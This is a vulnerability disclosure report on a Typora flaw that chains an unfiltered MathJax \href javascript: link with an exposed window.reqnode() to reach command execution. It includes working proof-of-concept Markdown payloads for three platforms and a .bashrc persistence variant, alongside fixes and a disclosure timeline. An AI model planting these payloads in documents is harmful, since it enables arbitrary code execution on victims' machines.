# Typora MathJax safe Extension Bypass Leading to Remote Code Execution

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Affected Software** | Typora ≤ 1.13.7 |
| **Affected Platforms** | Windows / macOS / Linux (all platforms) |
| **Vulnerability Type** | CWE-79: Cross-site Scripting (XSS) → CWE-94: Code Injection |
| **Attack Vector** | Local (malicious .md file) |
| **User Interaction** | Required (triple-click on rendered MathJax link) |
| **Impact** | Remote Code Execution (RCE) with current user privileges |
| **CVSS 3.1** | 7.3 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H) |
| **Component** | MathJax v4 `\href` command + `window.reqnode()` exposure |

---

## 2. Vulnerability Description

Typora is an Electron-based Markdown editor. When a user opens a malicious `.md` file containing a specially crafted MathJax formula, the MathJax `\href{javascript:...}` command renders a clickable link with a `javascript:` protocol URL in the DOM. Despite the MathJax `safe` extension being configured with `javascript: false`, the `javascript:` URL is **not filtered** and remains functional in the rendered output.

Additionally, Typora exposes a privileged function `window.reqnode()` in the renderer process, which is functionally equivalent to Node.js `require()`. This function bypasses the `nodeIntegration: false` protection configured for the editor window.

When a user triple-clicks the rendered MathJax link, the `javascript:` URL is executed in the renderer context. Through `window.reqnode('child_process')`, the attacker gains full access to Node.js's `child_process` module, enabling arbitrary command execution with the current user's privileges.

**This vulnerability affects all three platforms (Windows, macOS, Linux) because the vulnerable code resides in the cross-platform `app.asar` JavaScript bundle.**

---

## 3. Technical Analysis

### 3.1 MathJax `safe` Extension Bypass

Typora configures MathJax with the `safe` extension and sets `safeProtocols.javascript: false`:

```
safe: {
  URLs: "safe",
  safeProtocols: {
    http: true,
    https: true,
    file: true,
    javascript: false,
    data: false
  }
}
```

However, the `safe` extension **does not actually filter** `javascript:` URLs in the `\href` command output. The `\href` handler (`Bp.Href`) directly sets the `href` attribute on the MathML node without any protocol validation:

```javascript
// MathJax v4 - tex-svg-full.js
// Bp.Href handler (simplified)
Href(t, C) {
    const e = t.GetArgument(C);  // Get URL from user input
    const s = Ip(t, C);          // Get content
    vo.setAttribute(s, "href", e); // Set href WITHOUT protocol filtering
    t.Push(s);
}
```

The SVG output handler (`handleHref`) then creates an `<a href="javascript:...">` element in the DOM:

```javascript
// SVG output handler
handleHref(node, svgNode) {
    const href = node.attributes.get("href");
    const a = document.createElementNS(SVG_NS, "a");
    a.setAttribute("href", href);  // javascript: URL passes through
    // ...
}
```

**Result**: `javascript:` URLs appear in the rendered DOM and are clickable.

### 3.2 `window.reqnode()` Exposure

Typora exposes a custom `reqnode()` function in the renderer process's `window` object. This function is functionally equivalent to Node.js's native `require()`:

```javascript
// Found in atom.compiled.dist.jsc
reqnode("electron").ipcRenderer.invoke("license.show");
```

The renderer window has `nodeIntegration: false` configured, which should prevent access to Node.js APIs. However, `window.reqnode()` completely bypasses this protection:

```javascript
// In renderer context:
typeof require        // "undefined" — blocked by nodeIntegration:false
typeof window.reqnode // "function"  — exposed by Typora, works as require()
```

Through `window.reqnode('child_process')`, an attacker can execute arbitrary system commands:

```javascript
window.reqnode('child_process').execSync('id');
// Output: uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
```

### 3.3 Attack Chain

```
┌─────────────────────────────────────────────────┐
│ 1. User opens malicious .md file in Typora      │
└──────────────────────┬──────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────┐
│ 2. MathJax renders \href{javascript:CODE}{text} │
│    - safe extension does NOT filter javascript:  │
│    - <a href="javascript:CODE"> appears in DOM  │
└──────────────────────┬──────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────┐
│ 3. User triple-clicks the rendered link          │
│    - Single click: select formula                │
│    - Double click: enter edit mode               │
│    - Triple click: follow the link               │
└──────────────────────┬──────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────┐
│ 4. JavaScript executes in renderer context       │
│    - CODE runs via javascript: protocol          │
└──────────────────────┬──────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────┐
│ 5. window.reqnode('child_process') → RCE        │
│    - Bypasses nodeIntegration: false             │
│    - Executes arbitrary commands as current user │
└─────────────────────────────────────────────────┘
```

---

## 4. Proof of Concept

### 4.1 PoC Markdown File

Create a file named `poc.md` with the following content:

**Linux:**

```markdown
$$
\href{javascript:window.reqnode('child_process').exec('gnome-calculator')}{{\color{red}\textbf{Click Here}}}
$$
```

**Windows:**

```markdown
$$
\href{javascript:window.reqnode('child_process').exec('calc')}{{\color{red}\textbf{Click Here}}}
$$
```

**macOS:**

```markdown
$$
\href{javascript:window.reqnode('child_process').exec('open -a Calculator')}{{\color{red}\textbf{Click Here}}}
$$
```

### 4.2 Reproduction Steps

1. Install Typora 1.13.7 (or any version ≤ 1.13.7) on the target platform
2. Create a `.md` file with the PoC content above
3. Open the file in Typora
4. Triple-click the red "Click Here" text in the rendered formula
5. Observe the calculator application launching

### 4.3 Expected Results

- **Linux**: `gnome-calculator` launches
- **Windows**: `calc.exe` launches
- **macOS**: Calculator.app launches

### 4.4 Screenshots

#### Screenshot 1: PoC file opened in Typora (Linux)

![image-20260605203426645](C:\Users\清隆\AppData\Roaming\Typora\typora-user-images\image-20260605203426645.png)

#### Screenshot 2: Calculator launched after triple-click (Linux)

![image-20260605203512014](C:\Users\清隆\AppData\Roaming\Typora\typora-user-images\image-20260605203512014.png)

#### Screenshot 3: PoC file opened in Typora (Windows)

![image-20260605204142410](C:\Users\清隆\AppData\Roaming\Typora\typora-user-images\image-20260605204142410.png)

#### Screenshot 4: Calculator launched after triple-click (Windows)

![image-20260605204234689](C:\Users\清隆\AppData\Roaming\Typora\typora-user-images\image-20260605204234689.png)

#### Screenshot 5: PoC file opened in Typora (macOS)

Also exists

#### Screenshot 6: Calculator launched after triple-click (macOS)

Also exists

---

## 5. Impact Assessment

### 5.1 Direct Impact

- **Arbitrary Command Execution**: An attacker can execute any system command with the privileges of the user running Typora
- **File Access**: Read, modify, or delete any file accessible to the current user
- **Credential Theft**: Access SSH keys, browser cookies, configuration files, and other sensitive data
- **Persistence**: Write malicious entries to `.bashrc`, `.ssh/authorized_keys`, or startup scripts

### 5.2 Privilege Escalation

If the victim user has `sudo` privileges (common on developer workstations), the attacker can achieve root-level access:

```markdown
$$
\href{javascript:window.reqnode('child_process').exec('bash -c "echo evil_line >> ~/.bashrc"')}{{\text{Click}}}
$$
```

When the user later runs `sudo`, the injected `.bashrc` commands execute with elevated privileges.

### 5.3 Attack Scenarios

1. **Malicious document sharing**: Attacker shares a `.md` file disguised as technical documentation, README, or meeting notes
2. **Supply chain**: Attacker compromises a repository containing Markdown documentation
3. **Phishing**: Attacker sends a `.md` file via email with social engineering to encourage opening and clicking

---

## 6. Root Cause Analysis

### 6.1 Why `safe` Extension Fails

The MathJax `safe` extension is designed to filter dangerous URL protocols. However, analysis of the `tex-svg-full.js` bundle reveals that the `safe` extension is **not actually loaded** in Typora's MathJax configuration. Searching for "Safe" or "safe" extension registration in the bundle yields zero results for the actual safe extension handler code.

The `safe` configuration object exists in Typora's MathJax config, but the extension that would enforce it is not loaded. This means the `safeProtocols` configuration is effectively dead code — it's set but never checked.

### 6.2 Why `reqnode` Is Exposed

Typora uses `reqnode` internally for license validation and IPC communication from the renderer process:

```javascript
reqnode("electron").ipcRenderer.invoke("license.show");
```

This function is exposed on the `window` object, making it accessible to any JavaScript running in the renderer context. This defeats the purpose of setting `nodeIntegration: false`, as it provides an alternative path to access Node.js APIs.

---

## 7. Affected Versions

- Typora ≤ 1.13.7 (latest version at time of discovery)
- All platforms: Windows, macOS, Linux
- Both free and licensed versions

---

## 8. Recommended Fixes

### 8.1 Fix 1: Properly Load MathJax `safe` Extension (Primary)

Ensure the MathJax `safe` extension is actually loaded and functional, so that `javascript:` and `data:` URLs are filtered from `\href` output.

### 8.2 Fix 2: Remove `window.reqnode()` Exposure (Defense in Depth)

Move `reqnode` to a non-enumerable, non-accessible scope. Use Electron's `contextBridge` to expose only the specific APIs needed, rather than a general-purpose `require()` equivalent.

### 8.3 Fix 3: Implement URL Protocol Filtering in Typora's Renderer

Add server-side (renderer-side) filtering of `javascript:` and `data:` URLs in MathJax output, independent of MathJax's `safe` extension.

### 8.4 Fix 4: Enable `contextIsolation` (Best Practice)

Enable `contextIsolation: true` in the editor window's webPreferences to prevent renderer JavaScript from accessing the preload script's scope.

---

## 9. Workarounds (for users)

Until an official fix is released, users can mitigate this vulnerability by:

1. **Do not open `.md` files from untrusted sources**
2. **Do not click links in MathJax formulas** in documents from untrusted sources
3. **Use an alternative Markdown viewer** for untrusted documents (e.g., web-based Markdown renderers that run in a sandboxed browser)

---

## 10. Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-06-04 | Vulnerability discovered and confirmed |
| 2026-06-XX | Vendor notified via [GitHub Issues / Email] |
| 2026-06-XX | Vendor acknowledges receipt |
| 2026-XX-XX | Vendor releases fix |
| 2026-XX-XX | CVE requested from MITRE |
| 2026-XX-XX | Public disclosure (90 days after vendor notification) |

---

## 11. References

- CVE-2023-2317: Previous Typora XSS via `<embed>` tag (different entry point, same `reqnode` attack path)
- CVE-2024-41481: MathJax XSS in Typora (different MathJax version)
- Electron Security Checklist: https://www.electronjs.org/docs/latest/tutorial/security
- MathJax Safe Extension: https://docs.mathjax.org/en/latest/options/safe.html

---

## 12. Contact

flag7856@foxmail.com

---

## Appendix A: Full PoC File Content

### Linux PoC (`poc-linux.md`)

```markdown
# Document

$$
\href{javascript:window.reqnode('child_process').exec('gnome-calculator')}{{\color{red}\textbf{Click Here}}}
$$
```

### Windows PoC (`poc-windows.md`)

```markdown
# Document

$$
\href{javascript:window.reqnode('child_process').exec('calc')}{{\color{red}\textbf{Click Here}}}
$$
```

### macOS PoC (`poc-macos.md`)

```markdown
# Document

$$
\href{javascript:window.reqnode('child_process').exec('open -a Calculator')}{{\color{red}\textbf{Click Here}}}
$$
```

## Appendix B: DOM Evidence

The following data was extracted from Typora's renderer process using Electron DevTools, confirming that `javascript:` URLs are present in the rendered DOM:

```
MathJax safe config: safe.URLs="safe", safe.safeProtocols.javascript=false
MathJax safe extension: NOT LOADED (not found in bundle)

Rendered DOM:
  <a href="javascript:alert(1)">click me</a>  ← javascript: URL present, not filtered

window.reqnode: function  ← exposed in renderer
window.reqnode('child_process').execSync('id'): uid=1000(user)  ← RCE confirmed
```

## Appendix C: CVSS 3.1 Score Calculation

```
Attack Vector (AV): Local (L) — requires opening a local .md file
Attack Complexity (AC): Low (L) — no special conditions needed
Privileges Required (PR): None (N) — no authentication required
User Interaction (UI): Required (R) — triple-click needed
Scope (S): Unchanged (U)
Confidentiality (C): High (H) — full file system access
Integrity (I): High (H) — can modify any user-accessible file
Availability (A): High (H) — can delete files or crash system

CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H = 7.3 (High)
```
